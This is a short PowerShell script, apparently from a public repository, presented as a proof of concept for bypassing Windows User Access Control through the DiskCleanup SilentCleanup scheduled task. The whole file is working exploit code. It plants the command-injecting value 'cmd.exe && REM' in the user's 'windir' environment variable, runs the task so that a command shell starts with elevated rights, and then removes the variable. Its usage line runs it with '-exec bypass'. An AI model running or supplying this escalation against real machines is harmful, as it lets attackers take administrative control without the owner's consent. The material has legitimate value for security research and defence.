<#
.SYNOPSIS
  Noninteractive version of script, for directly execute.
  This script is a proof of concept to bypass the User Access Control (UAC) via DiskCleanup
.NOTES
	File Name  : DiskCleanupBypass_direct.ps1
	Author     : Gushmazuko
.LINK
	https://github.com/gushmazuko/WinBypass/blob/master/DiskCleanupBypass_direct.ps1
	Original source: https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/
.EXAMPLE
	Load "cmd.exe" (By Default used 'arch 64'):
	powershell -exec bypass .\DiskCleanupBypass_direct.ps1
#>

$program = "cmd.exe && REM"
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $program -Force
#For x64 shell in Windows x64:
Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
#For x86 shell in Windows x64:
#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I""
Start-Sleep 3
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
